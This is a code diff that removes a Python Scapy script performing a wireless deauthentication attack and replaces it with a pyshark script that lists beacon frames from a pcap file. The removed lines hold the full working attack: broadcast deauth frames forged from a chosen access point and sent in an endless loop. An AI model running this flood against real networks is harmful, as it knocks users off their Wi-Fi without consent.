@@ -1,36 +1,31 @@
-import argparse
-from scapy.all import *
+import pyshark
 
-# Function to send deauth packets to disconnect all clients from the AP
-def send_deauth(ap_mac, interface):
-    # Broadcast address for deauthentication
-    broadcast_mac = 'ff:ff:ff:ff:ff:ff'
+# Function to capture beacon frames from a pcap file
+def capture_beacon_frames(pcap_file):
+    # Create a capture object for the pcap file
+    capture = pyshark.FileCapture(pcap_file, display_filter="wlan.fc.type_subtype == 8")
+
+    # Display the details of each captured beacon frame
+    print(f"{'BSSID':<20} {'ESSID':<30} {'PWR':<6} {'CH':<4} {'ENC':<10} {'CIPHER':<6}")
     
-    # Construct a basic 802.11 deauthentication frame
-    dot11 = Dot11(addr1=broadcast_mac, addr2=ap_mac, addr3=ap_mac)
-    packet = RadioTap()/dot11/Dot11Deauth()
-    
-    # Send the packet endlessly
-    sendp(packet, iface=interface, verbose=False)
+    for packet in capture:
+        if hasattr(packet, "wlan"):
+            bssid = packet.wlan.bssid
+            essid = packet.wlan.ssid
+            # Get signal strength from the radiotap header, if available
+            try:
+                power = packet.radiotap.dbm_antsignal
+            except AttributeError:
+                power = "N/A"
+            
+            # Try to capture the channel and encryption type from the beacon frame
+            channel = packet.wlan_radio.channel if hasattr(packet, "wlan_radio") else "N/A"
+            encryption = packet.wlan.wep_id if hasattr(packet.wlan, "wep_id") else "Unknown"
+            
+            # Print the captured data
+            print(f"{bssid:<20} {essid:<30} {power:<6} {channel:<4} {encryption:<10} {'N/A':<6}")
 
-# Main function to parse arguments and run the deauth attack
-def main():
-    parser = argparse.ArgumentParser(description="Deauthentication attack script to disconnect all clients")
-    parser.add_argument('--deauth', type=int, default=0, help="Deauth mode (0 to enable)")
-    parser.add_argument('-a', '--ap', required=True, help="MAC address of the Access Point (AP)")
-    parser.add_argument('-i', '--interface', required=True, help="Network interface to use")
-
-    args = parser.parse_args()
-
-    if args.deauth == 0:
-        print("Starting deauthentication attack to disconnect all clients. Press Ctrl+C to stop.")
-        try:
-            while True:
-                send_deauth(ap_mac=args.ap, interface=args.interface)
-        except KeyboardInterrupt:
-            print("\nDeauthentication attack stopped.")
-    else:
-        print("Invalid argument for --deauth. Set it to 0 to start the attack.")
-
+# Main function
 if __name__ == "__main__":
-    main()
+    pcap_file = "cap.pcap"  # Replace with the path to your PCAP file
+    capture_beacon_frames(pcap_file)
